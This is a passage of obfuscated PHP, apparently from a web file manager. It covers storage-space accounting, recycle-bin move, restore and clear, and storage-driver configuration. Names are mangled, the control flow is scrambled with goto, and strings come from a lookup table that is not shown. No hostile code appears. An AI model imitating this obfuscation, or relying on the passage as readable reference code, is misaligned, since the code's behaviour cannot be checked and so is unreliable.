$aëôÊ’ÆÒÄ[$aöÇ²·¢…Ì[366]], $aöÇ²·¢…Ì[77], $aëôÊ’ÆÒÄ[$aöÇ²·¢…Ì[77]]); } $this->saveAll($d˜ŸİäŠ¯é); goto dƒšåí·™’; b†áÁŸ±Õ: $AÕÒï²Üé[$aöÇ²·¢…Ì[367]] = 0; $fªÑù°Âß‰ = $this->field($fÜ¹ˆµÛì)->where($AÕÒï²Üé)->select(); if (!$fªÑù°Âß‰) { return; } goto Cì…¹éÎÌ; dƒšåí·™’: } public function userSpaceReset($cæÕÈš´Â = false) { $Eùèæ°ğ™Ï =& $_SERVER[¼]; $A…²¦İ„÷Ú = $this->where(array($Eùèæ°ğ™Ï[368] => self::TYPE_USER, $Eùèæ°ğ™Ï[452] => $cæÕÈš´Â, $Eùèæ°ğ™Ï[367] => 0))->sum($Eùèæ°ğ™Ï[77]); Model($Eùèæ°ğ™Ï[470])->userEdit($cæÕÈš´Â, array($Eùèæ°ğ™Ï[2053] => $A…²¦İ„÷Ú)); } public function targetSpaceUpdate($Bƒ÷ Á™¶, $CÃ¨£‘äô) { $cÆò‰Ì“Ë =& $_SERVER[¼]; if (!$CÃ¨£‘äô) { return; } if (!in_array($Bƒ÷ Á™¶, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $c»â‹°Â‹À = $this->targetSpaceSize($Bƒ÷ Á™¶, $CÃ¨£‘äô); if ($Bƒ÷ Á™¶ == self::TYPE_USER) { Model($cÆò‰Ì“Ë[470])->userEdit($CÃ¨£‘äô, array($cÆò‰Ì“Ë[2053] => $c»â‹°Â‹À)); } else { if ($Bƒ÷ Á™¶ == self::TYPE_GROUP) { Model($cÆò‰Ì“Ë[454])->groupEdit($CÃ¨£‘äô, array($cÆò‰Ì“Ë[2053] => $c»â‹°Â‹À)); } } } public function targetSpaceSize($F¶ˆ†ÖÑì, $DÑÜ¯ñÇ¨) { goto A²§õ§‹©Ÿ; A²§õ§‹©Ÿ: $a’ëÖÁƒ«ˆ =& $_SERVER[¼]; $E§àã¯Äª = $this->sourceRoot($F¶ˆ†ÖÑì, $DÑÜ¯ñÇ¨, !0); if (!$E§àã¯Äª) { return 0; } goto cùîô“õ†˜; AˆÄâàãİè: $d·ƒ¬‹×Ü = array_to_keyvalue($d·ƒ¬‹×Ü, $a’ëÖÁƒ«ˆ[33], $a’ëÖÁƒ«ˆ[366]); $d·ƒ¬‹×Ü = array_unique(array_filter($d·ƒ¬‹×Ü)); if ($d·ƒ¬‹×Ü) { $fÇ±ì¯ãô¨ = array($a’ëÖÁƒ«ˆ[380] => array($a’ëÖÁƒ«ˆ[381], $d·ƒ¬‹×Ü)); $F‰Ö’ÜÎ  += floatval($this->where($fÇ±ì¯ãô¨)->sum($a’ëÖÁƒ«ˆ[77])); } goto b†ïÆÂ×ÎŒ; cùîô“õ†˜: $F‰Ö’ÜÎ  = floatval($E§àã¯Äª[$a’ëÖÁƒ«ˆ[77]]); $fÇ±ì¯ãô¨ = array($a’ëÖÁƒ«ˆ[521] => array($a’ëÖÁƒ«ˆ[479], $a’ëÖÁƒ«ˆ[466] . $E§àã¯Äª[$a’ëÖÁƒ«ˆ[366]] . $a’ëÖÁƒ«ˆ[480])); $d·ƒ¬‹×Ü = Model($a’ëÖÁƒ«ˆ[391])->field($a’ëÖÁƒ«ˆ[380])->where($fÇ±ì¯ãô¨)->select(); goto AˆÄâàãİè; b†ïÆÂ×ÎŒ: return $F‰Ö’ÜÎ ; goto dÍÉØ¡¤; dÍÉØ¡¤: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($c¼É‚÷‹ÉÃ) { return $this->fileTypeProfile($c¼É‚÷‹ÉÃ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($EÑ²Èõ¹ìË) { return $this->fileTypeProfile($EÑ²Èõ¹ìË, SourceModel::TYPE_GROUP); } private function fileTypeProfile($F–šˆßôÌ™, $Bçòâº©½›) { goto cà‚—ğöÂñ; Aš×¸ç²¡: if ($bÒèİåÇÁ÷) { return $bÒèİåÇÁ÷; } $fïµÍùåáè = array($BÛŠóµ£[514] => 0); if ($F–šˆßôÌ™ != !1) { $fïµÍùåáè[$BÛŠóµ£[452]] = $F–šˆßôÌ™; $fïµÍùåáè[$BÛŠóµ£[368]] = $Bçòâº©½›; } goto bìºÃƒƒ˜; bìºÃƒƒ˜: $D’ˆ¼áâˆ = array(); $D’ˆ¼áâˆ[$BÛŠóµ£[2312]] = array($BÛŠóµ£[2313] => LNG($BÛŠóµ£[2312]), $BÛŠóµ£[2314] => $this->where($fïµÍùåáè)->count(), $BÛŠóµ£[516] => $this->where($fïµÍùåáè)->sum($BÛŠóµ£[77])); $FÂ·ïËÌœÉ = KodIO::fileTypeList(); goto eòèÕŠ½‰Ó; cà‚—ğöÂñ: $BÛŠóµ£ =& $_SERVER[¼]; $BñˆŸšÄÂô = $BÛŠóµ£[2311] . $F–šˆßôÌ™ . $BÛŠóµ£[70] . $Bçòâº©½›; $bÒèİåÇÁ÷ = Cache::get($BñˆŸšÄÂô); goto Aš×¸ç²¡; eòèÕŠ½‰Ó: foreach ($FÂ·ïËÌœÉ as $bÍÔô‘À» => $A£°Ê¥‹óÌ) { $fïµÍùåáè[$BÛŠóµ£[369]] = $this->fileTypeWhere($bÍÔô‘À»); $D’ˆ¼áâˆ[$bÍÔô‘À»] = array($BÛŠóµ£[2313] => $A£°Ê¥‹óÌ[$BÛŠóµ£[28]], $BÛŠóµ£[2314] => $this->where($fïµÍùåáè)->count(), $BÛŠóµ£[516] => $this->where($fïµÍùåáè)->sum($BÛŠóµ£[77])); } Cache::set($BñˆŸšÄÂô, $D’ˆ¼áâˆ, 1200); return $D’ˆ¼áâˆ; goto Cƒ”š÷ñ‰×; Cƒ”š÷ñ‰×: } public function fileNameExist($A¦ƒî¬‰Ì, $B…ñÒÂ·ö«) { $C° á±¹ŒÌ =& $_SERVER[¼]; $c‘¤•˜²³¡ = $this->childList($A¦ƒî¬‰Ì); foreach ($c‘¤•˜²³¡ as $eèŞ›„ƒŞŒ) { if ($eèŞ›„ƒŞŒ[$C° á±¹ŒÌ[28]] == $B…ñÒÂ·ö«) { return $eèŞ›„ƒŞŒ[$C° á±¹ŒÌ[366]]; } } return !1; } public function childList($DÙê“ëÊ·Ì) { goto F‚›‹–Á£; DÕŞ—íí…¶: self::$cacheChildList[$b‘¶§ôõà] = $c†“É©„ ; foreach ($c†“É©„  as $Bøñ…½‰àĞ) { $b‘¶§ôõà = $aµÑ¤™ã½[406] . $Bøñ…½‰àĞ[$aµÑ¤™ã½[366]]; self::$cacheSourceInfo[$b‘¶§ôõà] = $Bøñ…½‰àĞ; } return $c†“É©„ ; goto aÈ‚„òğ; aİÒ ³İ»®: $A§Ï¶Š„è™ = array($aµÑ¤™ã½[457] => intval($DÙê“ëÊ·Ì), $aµÑ¤™ã½[393] => 0); $c†“É©„  = $this->where($A§Ï¶Š„è™)->select(); $c†“É©„  = $c†“É©„  ? $c†“É©„  : array(); goto DÕŞ—íí…¶; F‚›‹–Á£: $aµÑ¤™ã½ =& $_SERVER[¼]; $b‘¶§ôõà = $aµÑ¤™ã½[2293] . $DÙê“ëÊ·Ì; if (isset(self::$cacheChildList[$b‘¶§ôõà])) { return self::$cacheChildList[$b‘¶§ôõà]; } goto aİÒ ³İ»®; aÈ‚„òğ: } public function fileNameAuto($dœŸí•Ğİ, $Aà´½¾Ñò±, $d”Àñ—˜ = REPEAT_RENAME, $eçÖ¼»ŠÕ  = false) { $C«…¸¦Îä† =& $_SERVER[¼]; $AäÑÏÁø« = $this->childList($dœŸí•Ğİ); $c°½•¿¿–² = array_to_keyvalue($AäÑÏÁø«, $C«…¸¦Îä†[33], $C«…¸¦Îä†[28]); return $this->fileNameAutoGet($c°½•¿¿–², $Aà´½¾Ñò±, $d”Àñ—˜, $eçÖ¼»ŠÕ ); } public function fileNameAutoGet($d‰ÀëÚ¥Í, $EØàƒÏ¬¶ï, $Bî•ˆ’¼Š, $c „ö¬¹ï) { $CøƒËƒº¢ =& $_SERVER[¼]; if ($Bî•ˆ’¼Š == REPEAT_REPLACE || !$d‰ÀëÚ¥Í || !in_array_not_case($EØàƒÏ¬¶ï, $d‰ÀëÚ¥Í) || $c „ö¬¹ï && $Bî•ˆ’¼Š != REPEAT_RENAME_FOLDER) { return $EØàƒÏ¬¶ï; } if ($Bî•ˆ’¼Š == REPEAT_SKIP) { return !1; } $F‰æÂ†…ïË = $CøƒËƒº¢[93] . get_path_ext($EØàƒÏ¬¶ï); $F‰æÂ†…ïË = $F‰æÂ†…ïË == $CøƒËƒº¢[93] || $c „ö¬¹ï ? $CøƒËƒº¢[33] : $F‰æÂ†…ïË; for ($fñ‡õØ»Ã‚ = 1; $fñ‡õØ»Ã‚ <= count($d‰ÀëÚ¥Í) + 1; $fñ‡õØ»Ã‚++) { $A§ìÃä– = substr($EØàƒÏ¬¶ï, 0, strlen($EØàƒÏ¬¶ï) - strlen($F‰æÂ†…ïË)); $fí‚ä×Œ¡¥ = $A§ìÃä– . "\50{$fñ‡õØ»Ã‚}\x29{$F‰æÂ†…ïË}"; if (!in_array_not_case($fí‚ä×Œ¡¥, $d‰ÀëÚ¥Í)) { return $fí‚ä×Œ¡¥; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\x72\143\145\137\162\x65\x63\171\143\154\145"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\x54\151\155\x65", "\x74\x69\x6d\x65", "\151\156\163\145\162\164", "\146\x75\156\x63\x74\151\157\156")); public function listData($eóÉöæŞò = false) { $E…¸à£¢Í =& $_SERVER[¼]; $eóÉöæŞò = $eóÉöæŞò ? $eóÉöæŞò : USER_ID; $FË°¿ê£›İ = $this->where(array($E…¸à£¢Í[1395] => $eóÉöæŞò))->select(); return array_to_keyvalue($FË°¿ê£›İ, $E…¸à£¢Í[33], $E…¸à£¢Í[366]); } public function moveToRecycle($có‡–ÔÒæ…) { goto Bº·­ÖàƒÚ; Bº·­ÖàƒÚ: $f¡Ÿ§ÌğŒ’ =& $_SERVER[¼]; $fîñïè­ß = Model($f¡Ÿ§ÌğŒ’[1103]); $eÅÒŒô¨Í = $fîñïè­ß->sourceInfo($có‡–ÔÒæ…); goto cßĞ‹À·ò’; FºÏ¤ •Éò: $this->recycleMove($có‡–ÔÒæ…, 1); if ($eÅÒŒô¨Í[$f¡Ÿ§ÌğŒ’[367]] == $f¡Ÿ§ÌğŒ’[83]) { $dÄ®¹³Í ° = array($f¡Ÿ§ÌğŒ’[521] => array($f¡Ÿ§ÌğŒ’[479], $eÅÒŒô¨Í[$f¡Ÿ§ÌğŒ’[455]] . $có‡–ÔÒæ… . $f¡Ÿ§ÌğŒ’[480])); $fîñïè­ß->where($dÄ®¹³Í °)->setField($f¡Ÿ§ÌğŒ’[393], 1); } goto D¶ÔŞáŒÕ; cßĞ‹À·ò’: if (!$eÅÒŒô¨Í || $eÅÒŒô¨Í[$f¡Ÿ§ÌğŒ’[393]] == $f¡Ÿ§ÌğŒ’[83]) { return; } $BàíÊÃ„ÆÄ = array($f¡Ÿ§ÌğŒ’[380] => $có‡–ÔÒæ…, $f¡Ÿ§ÌğŒ’[1395] => USER_ID, $f¡Ÿ§ÌğŒ’[517] => $eÅÒŒô¨Í[$f¡Ÿ§ÌğŒ’[368]], $f¡Ÿ§ÌğŒ’[518] => $eÅÒŒô¨Í[$f¡Ÿ§ÌğŒ’[452]], $f¡Ÿ§ÌğŒ’[521] => $eÅÒŒô¨Í[$f¡Ÿ§ÌğŒ’[455]]); $this->add($BàíÊÃ„ÆÄ); goto FºÏ¤ •Éò; D¶ÔŞáŒÕ: } public function clear() { $this->remove(!1); } public function remove($FÔ‹»±™ä× = false) { goto BÇ¼·¿ä‰·; BÇ¼·¿ä‰·: $dÈëÒŠø•µ =& $_SERVER[¼]; $a½„ºÌàùÇ = Model($dÈëÒŠø•µ[1103]); $Dùå„ÊÁŸ = $this->listData(); goto e†Ó¥È‘ì„; a‡‹à°Å‰: foreach ($c¿´„¥Ô‘  as $DÛ‘º“ç¯) { $a½„ºÌàùÇ->targetSpaceUpdate($DÛ‘º“ç¯[$dÈëÒŠø•µ[368]], $DÛ‘º“ç¯[$dÈëÒŠø•µ[452]]); } goto e™á†®Û«Ñ; e†Ó¥È‘ì„: $FÔ‹»±™ä× = $FÔ‹»±™ä× === !1 ? !1 : $FÔ‹»±™ä×; $c¿´„¥Ô‘  = array(); foreach ($Dùå„ÊÁŸ as $d§…ô‰­ãæ) { if ($FÔ‹»±™ä× != !1 && !in_array($d§…ô‰­ãæ, $FÔ‹»±™ä×)) { continue; } $a½„ºÌàùÇ->remove($d§…ô‰­ãæ, !1); $FÄ´¤™‡Ò = $this->where(array($dÈëÒŠø•µ[366] => $d§…ô‰­ãæ))->find(); $aÃì…›Ö˜ = $FÄ´¤™‡Ò[$dÈëÒŠø•µ[368]] . $dÈëÒŠø•µ[70] . $FÄ´¤™‡Ò[$dÈëÒŠø•µ[452]]; $c¿´„¥Ô‘ [$aÃì…›Ö˜] = array($dÈëÒŠø•µ[517] => $FÄ´¤™‡Ò[$dÈëÒŠø•µ[368]], $dÈëÒŠø•µ[452] => $FÄ´¤™‡Ò[$dÈëÒŠø•µ[452]]); $this->where(array($dÈëÒŠø•µ[366] => $d§…ô‰­ãæ))->delete(); } goto a‡‹à°Å‰; e™á†®Û«Ñ: } public function restore($A²‡§•á±Ó = false) { goto dÇÇŒ»åœä; CÁñ’ª¤Ù: foreach ($AÂ…†·±Ş as $eì¾ñÆ¾) { goto f‚ö£²ÕÒê; f‚ö£²ÕÒê: if ($A²‡§•á±Ó != !1 && !in_array($eì¾ñÆ¾, $A²‡§•á±Ó)) { continue; } $DÁ¯£ö· = $a°¤Ò¥¢íÓ->sourceInfo($eì¾ñÆ¾); $BÚ¢İùÉ™ = $a°¤Ò¥¢íÓ->sourceInfo($DÁ¯£ö·[$dÎÍõ¯ ‹¡[457]]); goto a¥ÒÒ±êŸÁ; a¥ÒÒ±êŸÁ: if ($BÚ¢İùÉ™[$dÎÍõ¯ ‹¡[393]] == $dÎÍõ¯ ‹¡[83]) { continue; } $a°¤Ò¥¢íÓ->lockMoveStart($eì¾ñÆ¾); $this->recycleMove($eì¾ñÆ¾, 0); goto D—Œ×öÔÜ; D—Œ×öÔÜ: if ($DÁ¯£ö·[$dÎÍõ¯ ‹¡[367]] == $dÎÍõ¯ ‹¡[83]) { $dïùİ’Ğù„ = array($dÎÍõ¯ ‹¡[521] => array($dÎÍõ¯ ‹¡[479], $DÁ¯£ö·[$dÎÍõ¯ ‹¡[455]] . $eì¾ñÆ¾ . $dÎÍõ¯ ‹¡[480])); $a°¤Ò¥¢íÓ->where($dïùİ’Ğù„)->setField($dÎÍõ¯ ‹¡[393], 0); } $this->where(array($dÎÍõ¯ ‹¡[366] => $eì¾ñÆ¾))->delete(); $a°¤Ò¥¢íÓ->folderSizeReset($DÁ¯£ö·[$dÎÍõ¯ ‹¡[457]]); goto fİ¿ÏøùŠ¤; fİ¿ÏøùŠ¤: $fÆŒ¹ñÏ²Ú[] = $DÁ¯£ö·[$dÎÍõ¯ ‹¡[457]]; if ($DÁ¯£ö·[$dÎÍõ¯ ‹¡[367]] == $dÎÍõ¯ ‹¡[83]) { $fÆŒ¹ñÏ²Ú[] = $eì¾ñÆ¾; } $a°¤Ò¥¢íÓ->lockMoveEnd($eì¾ñÆ¾); goto eºæãá™ó¾; eºæãá™ó¾: } $a°¤Ò¥¢íÓ->updateModifyTime($fÆŒ¹ñÏ²Ú); goto dÄ´ËÅòº; cëÈØ‡Ã ¼: $A²‡§•á±Ó = $A²‡§•á±Ó == !1 ? !1 : $A²‡§•á±Ó; if (!$AÂ…†·±Ş) { return !0; } $fÆŒ¹ñÏ²Ú = array(); goto CÁñ’ª¤Ù; dÇÇŒ»åœä: $dÎÍõ¯ ‹¡ =& $_SERVER[¼]; $a°¤Ò¥¢íÓ = Model($dÎÍõ¯ ‹¡[1103]); $AÂ…†·±Ş = $this->listData(); goto cëÈØ‡Ã ¼; dÄ´ËÅòº: } private function recycleMove($b·ø¹‡‚÷â, $B ôíøÅ = 1) { $fæƒ¤¶†š =& $_SERVER[¼]; $DËØ…‹—· = Model($fæƒ¤¶†š[1103]); $eË³„†¬ÇÛ = Model($fæƒ¤¶†š[2315]); $cã±àÙ¡ = array($fæƒ¤¶†š[366] => $b·ø¹‡‚÷â); if ($B ôíøÅ) { $DËØ…‹—·->where($cã±àÙ¡)->setField($fæƒ¤¶†š[393], 1); $eË³„†¬ÇÛ->eventRecycle($b·ø¹‡‚÷â, $fæƒ¤¶†š[2316]); } else { $dàÍ¬¦¬ = $DËØ…‹—·->where($cã±àÙ¡)->find(); $cÓµß¡·  = $dàÍ¬¦¬[$fæƒ¤¶†š[367]] == $fæƒ¤¶†š[83]; $dŒÄç„ø— = $DËØ…‹—·->fileNameAuto($dàÍ¬¦¬[$fæƒ¤¶†š[457]], $dàÍ¬¦¬[$fæƒ¤¶†š[28]], REPEAT_RENAME_FOLDER, $cÓµß¡· ); if ($dŒÄç„ø— != $dàÍ¬¦¬[$fæƒ¤¶†š[28]]) { $DËØ…‹—·->rename($b·ø¹‡‚÷â, $dŒÄç„ø—); } $DËØ…‹—·->where($cã±àÙ¡)->setField($fæƒ¤¶†š[393], 0); $eË³„†¬ÇÛ->eventRecycle($b·ø¹‡‚÷â, $fæƒ¤¶†š[2317]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\163\164\157\x72\x61\147\x65\x4c\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\163\151\x7a\x65\115\141\170", "\x73\171\163\x74\x65\x6d", "\144\145\146\141\x75\x6c\164", "\x64\x72\151\x76\x65\162", "\x63\157\156\x66\x69\x67"); public function listData($A¸³Ê«¥†° = false, $D•á¤º¾Ê‰ = "\155\x6f\x64\151\x66\x79\124\x69\x6d\145", $c¼´ââ¬ëø = false) { goto d¬¬³ã‡£•; d¬¬³ã‡£•: $bæˆ é“¹Ä =& $_SERVER[¼]; $fäÇâ¯ÃÕ£ = parent::listData($A¸³Ê«¥†°, $D•á¤º¾Ê‰, $c¼´ââ¬ëø); if ($A¸³Ê«¥†°) { return $fäÇâ¯ÃÕ£; } goto AçÂñ¯³‹é; D™Õ´Öãò‚: return $fäÇâ¯ÃÕ£; goto D×²–‹ëÖ; AçÂñ¯³‹é: foreach ($fäÇâ¯ÃÕ£ as $aÎÄ³‚”µ => $f™Œ„´ñ¨¡) { unset($fäÇâ¯ÃÕ£[$aÎÄ³‚”µ][$bæˆ é“¹Ä[6]]); $fäÇâ¯ÃÕ£[$aÎÄ³‚”µ][$bæˆ é“¹Ä[2053]] = 0; } $c—ĞÒ††˜ = array_to_keyvalue($fäÇâ¯ÃÕ£, $bæˆ é“¹Ä[33], $bæˆ é“¹Ä[364]); $this->_listAppendSize($fäÇâ¯ÃÕ£, $c—ĞÒ††˜); goto D™Õ´Öãò‚; D×²–‹ëÖ: } public function _listAppendSize(&$BÇ¢±¥Ô‡Ñ, $aºŒœºñö¥) { $b±Ø±Ä¯µ =& $_SERVER[¼]; $báÏ§êğŠœ = $b±Ø±Ä¯µ[2318] . implode($b±Ø±Ä¯µ[47], $aºŒœºñö¥) . $b±Ø±Ä¯µ[2319]; $c£äóÚà˜ = Model($b±Ø±Ä¯µ[711])->query($báÏ§êğŠœ); $c£äóÚà˜ = array_to_keyvalue($c£äóÚà˜, $b±Ø±Ä¯µ[364], $b±Ø±Ä¯µ[77]); foreach ($BÇ¢±¥Ô‡Ñ as $C‘¡¤‚ô => $D‰õª–Æ´µ) { $BÇ¢±¥Ô‡Ñ[$C‘¡¤‚ô][$b±Ø±Ä¯µ[2053]] = isset($c£äóÚà˜[$D‰õª–Æ´µ[$b±Ø±Ä¯µ[364]]]) ? $c£äóÚà˜[$D‰õª–Æ´µ[$b±Ø±Ä¯µ[364]]] : 0; } } public function getConfig($d»¤Í‚²‡…) { $Aò×®Ê„ôÌ = parent::listData($d»¤Í‚²‡…); return json_decode($Aò×®Ê„ôÌ[$_SERVER[¼][6]], !0); } public function update($a‘Òæ‚î÷², $EµØÜœ„†¢) { goto f÷ßÉ´ßÓŒ; Cğ§íšø: $bèßã¥—æ¸ = parent::update($a‘Òæ‚î÷², $EµØÜœ„†¢); if ($bèßã¥—æ¸ && $EµØÜœ„†¢[$D™«½¦‚¿Â[34]]) { foreach ($B·åò§œ­ as $F†À‚ÏöŒ) { if ($F†À‚ÏöŒ[$D™«½¦‚¿Â[34]] && $F†À‚ÏöŒ[$D™«½¦‚¿Â[364]] != $a‘Òæ‚î÷²) { parent::update($F†À‚ÏöŒ[$D™«½¦‚¿Â[364]], array($D™«½¦‚¿Â[34] => 0)); } } } return $bèßã¥—æ¸; goto a¢‘éˆÌ¼; C¼Š°ËŸ: if (isset($B·åò§œ­[$f²‚é­]) && $B·åò§œ­[$f²‚é­][$D™«½¦‚¿Â[364]] != $a‘Òæ‚î÷²) { return !1; } if (isset($EµØÜœ„†¢[$D™«½¦‚¿Â[2320]]) && $EµØÜœ„†¢[$D™«½¦‚¿Â[2320]] == $D™«½¦‚¿Â[83]) { $this->checkConfig($EµØÜœ„†¢); } unset($EµØÜœ„†¢[$D™«½¦‚¿Â[2320]]); goto Cğ§íšø; f÷ßÉ´ßÓŒ: $D™«½¦‚¿Â =& $_SERVER[¼]; $f²‚é­ = $EµØÜœ„†¢[$D™«½¦‚¿Â[28]]; $B·åò§œ­ = array_to_keyvalue(parent::listData(), $D™«½¦‚¿Â[28]); goto C¼Š°ËŸ; a¢‘éˆÌ¼: } public function add($a½ßí‰»ˆŞ) { goto FÙí’¤‰ÓÙ; e±°ÖÅ½Ğ”: $this->checkConfig($a½ßí‰»ˆŞ); $D¦³ŸÁ‹²É = parent::insert($a½ßí‰»ˆŞ); if ($D¦³ŸÁ‹²É && $a½ßí‰»ˆŞ[$AíêŒ³Á”[34]]) { foreach ($A²ÊÀŸÑ¿± as $bíÚœÒŸ·ˆ) { if ($bíÚœÒŸ·ˆ[$AíêŒ³Á”[34]]) { parent::update($bíÚœÒŸ·ˆ[$AíêŒ³Á”[364]], array($AíêŒ³Á”[34] => 0)); } } } goto Böæãï¡ó; Böæãï¡ó: return $D¦³ŸÁ‹²É; goto e¡Ãİ¹†Š…; FÙí’¤‰ÓÙ: $AíêŒ³Á” =& $_SERVER[¼]; $A²ÊÀŸÑ¿± = array_to_keyvalue(parent::listData(), $AíêŒ³Á”[28]); if (isset($A²ÊÀŸÑ¿±[$a½ßí‰»ˆŞ[$AíêŒ³Á”[28]]])) { return !1; } goto e±°ÖÅ½Ğ”; e¡Ãİ¹†Š…: } public function checkConfig(&$Bêèµƒğ§³) { goto C™äÖÛÛÍ¥; d’Î½š‹ù¹: $Bêèµƒğ§³[$eÄÄ¤¾¥‘ñ[6]] = json_encode($f‡ËÇî”ìó); $Bêèµƒğ§³[$eÄÄ¤¾¥‘ñ[90]] = $fÀšåİù; return !0; goto eÙòÃ·ÃÆÑ; e¨š×‹†¹: $fÍğ„áÄŠä = $E²…ˆ ó–ò->getPath($Bëãå„‘‡Œ . $eÄÄ¤¾¥‘ñ[1949]); if (!$E²…ˆ ó–ò->mkfile($fÍğ„áÄŠä)) { show_json(LNG($eÄÄ¤¾¥‘ñ[2321]), !1); } $f‡ËÇî”ìó[$eÄÄ¤¾¥‘ñ[1017]] = $Bëãå„‘‡Œ; goto d’Î½š‹ù¹; C™äÖÛÛÍ¥: $eÄÄ¤¾¥‘ñ =& $_SERVER[¼]; $b£¡É­Êµô = strtolower($Bêèµƒğ§³[$eÄÄ¤¾¥‘ñ[90]]); $f‡ËÇî”ìó = json_decode_force($Bêèµƒğ§³[$eÄÄ¤¾¥‘ñ[6]]); goto f„µ•ÈÏß‚; f„µ•ÈÏß‚: foreach ($f‡ËÇî”ìó as $Aİ“Ÿ—÷í° => $Cì´æàŒ´) { $f‡ËÇî”ìó[$Aİ“Ÿ—÷í°] = trim($Cì´æàŒ´); } $Bëãå„‘‡Œ = rtrim($f‡ËÇî”ìó[$eÄÄ¤¾¥‘ñ[1017]], $eÄÄ¤¾¥‘ñ[8]) . $eÄÄ¤¾¥‘ñ[8]; $fÀšåİù = $this->driverType($b£¡É­Êµô); goto A½Ô‡ÚÄÓ; A½Ô‡ÚÄÓ: $FŠ¶³´Ò¨µ = $eÄÄ¤¾¥‘ñ[71] . $fÀšåİù; $E²…ˆ ó–ò = new $FŠ¶³´Ò¨µ($f‡ËÇî”ìó); if (in_array($b£¡É­Êµô, $E²…ˆ ó–ò->objectDriver)) { if (!$E²…ˆ ó–ò->isBucketCors() && !$E²…ˆ ó–ò->setBucketCors()) { $F˜…¤ìˆ´¢ = LNG($eÄÄ¤¾¥‘ñ[2321]); $F˜…¤ìˆ´¢ .= $eÄÄ¤¾¥‘ñ[2322] . LNG($eÄÄ¤¾¥‘ñ[2323]); show_json($F˜…¤ìˆ´¢, !1); } } goto e¨š×‹†¹; eÙòÃ·ÃÆÑ: } private function driverType($d™‹ˆ­¤ª¬) { $BË«È§¦Í’ =& $_SERVER[¼]; $AÈ‡´‡‰Èë = array($BË«È§¦Í’[103] => $BË«È§¦Í’[2324], $BË«È§¦Í’[58] => $BË«È§¦Í’[2325], $BË«È§¦Í’[64] => $BË«È§¦Í’[2326]); if (isset($AÈ‡´‡‰Èë[$d™‹ˆ­¤ª¬])) { return $AÈ‡´‡‰Èë[$d™‹ˆ­¤ª¬]; } return strtoupper($d™‹ˆ­¤ª¬); } public function driverListSystem() { $c„ëò»Ñ‰á =& $_SERVER[¼]; $fÒ„È”¿À = parent::listData(); $A—½¿ŒÆë = array(); foreach ($fÒ„È”¿À as $Dîòœ›ÓŠĞ) { unset($Dîòœ›ÓŠĞ[$c„ëò»Ñ‰á[184]], $Dîòœ›ÓŠĞ[$c„ëò»Ñ‰á[107]]); $Dîòœ›ÓŠĞ[$c„ëò»Ñ‰á[6]] = json_decode_force($Dîòœ›ÓŠĞ[$c„ëò»Ñ‰á[6]]); $A—½¿ŒÆë[] = $Dîòœ›ÓŠĞ; } return $A—½¿ŒÆë; } public function defaultDriver() { $bÕÙ¹²ï˜¸ =& $_SERVER[¼]; $E› ÖŒñµ = parent::listData(); $cêĞ¬®‹è‰ = array_filter_by_field($E› ÖŒñµ, $bÕÙ¹²ï˜¸[34], 1); $cêĞ¬®‹è‰ = $cêĞ¬®‹è‰[0]; if ($cêĞ¬®‹è‰) { $cêĞ¬®‹è‰[$bÕÙ¹²ï˜¸[6]] = json_decode($cêĞ¬®‹è‰[$bÕÙ¹²ï˜¸[6]], !0); } return $cêĞ¬®‹è‰; } public function driverInfo($AÉˆ•ŒÛïé) { $Dï£ î‡ôï =& $_SERVER[¼]; $dåÌ»†•Ñ† = array_to_keyvalue(parent::listData(), $Dï£ î‡ôï[364]); if (!isset($dåÌ»†•Ñ†[$AÉˆ•ŒÛïé])) { return !1; } $FÖ”ìÃ­¦µ = $dåÌ»†•Ñ†[$AÉˆ•ŒÛïé]; $FÖ”ìÃ­¦µ[$Dï£ î‡ôï[6]] = json_decode_force($FÖ”ìÃ­¦µ[$Dï£ î‡ôï[6]]); return $FÖ”ìÃ­¦µ; } public function remove($aİå†Ÿ…Æ‹) { $this->removeShareItems($aİå†Ÿ…Æ‹); return parent::remove($aİå†Ÿ…Æ‹); } public function removeWithFile($d¶—Šç¡†ƒ) { goto f‹£¯Ö‰ÚŞ; D´ó§§ºÛ’: $BÔÆÒ¶¬Ã…->task[$aÙñù‹µğõ[690]] = (double) $DÍ‚¹ê¶áÂ; $f×‚‹öÜßÏ = KodIO::defaultDriver(); $c„…ä³êğÈ = $f×‚‹öÜßÏ[$aÙñù‹µğõ[364]]; goto AÁ¦ˆ†„¦; aÓ®ÁÀù©: $DÍ‚¹ê¶áÂ = Model($aÙñù‹µğõ[418])->where($cñáÍ‹–Š)->sum($aÙñù‹µğõ[77]); $d›í“Šš†­ = $aÙñù‹µğõ[2327] . $d¶—Šç¡†ƒ; $BÔÆÒ¶¬Ã… = new TaskFileTransfer($d›í“Šš†­, $aÙñù‹µğõ[2328], $c¦ÆßÊ««, LNG($aÙñù‹µğõ[2329]) . "\x28{$d¶—Šç¡†ƒ}\51"); goto D´ó§§ºÛ’; c‡šñƒÆõ¤: if (!$böÀ‘ÔÙë·) { $BÔÆÒ¶¬Ã…->stop($d›í“Šš†­); return !1; } $BÔÆÒ¶¬Ã…->end(); $this->remove($d¶—Šç¡†ƒ); goto eØİÛÃÜÃÇ; AÁ¦ˆ†„¦: $C”Õœ´šì = "\x7b\151\x6f\72{$c„…ä³êğÈ}\x7d\57"; $böÀ‘ÔÙë· = !0; $AÊ–ğŸÈ”õ = array(); goto EÆÖ‹ªç¸½; EÆÖ‹ªç¸½: $C–³Ù§• = Model($aÙñù‹µğõ[164])->where($cñáÍ‹–Š)->field($aÙñù‹µğõ[2330])->select(); foreach ($C–³Ù§• as $eËëÛá×ƒ) { goto A––í‡òä; Bğè®¿ÃŞ: if (IO::exist($C…óéåº­º)) { $BÔÆÒ¶¬Ã…->updateFileEnd($eËëÛá×ƒ[$aÙñù‹µğõ[28]], $eËëÛá×ƒ[$aÙñù‹µğõ[77]]); continue; } if (!IO::move($Dó§ÂÚ×Œ­, get_path_father($C…óéåº­º))) { $böÀ‘ÔÙë· = !1; break; } $cñáÍ‹–Š = array($aÙñù‹µğõ[415] => $eËëÛá×ƒ[$aÙñù‹µğõ[415]]); goto Cñùì—öœ; Cñùì—öœ: $eÌ‘î¶Ê·í = array($aÙñù‹µğõ[735] => $c„…ä³êğÈ, 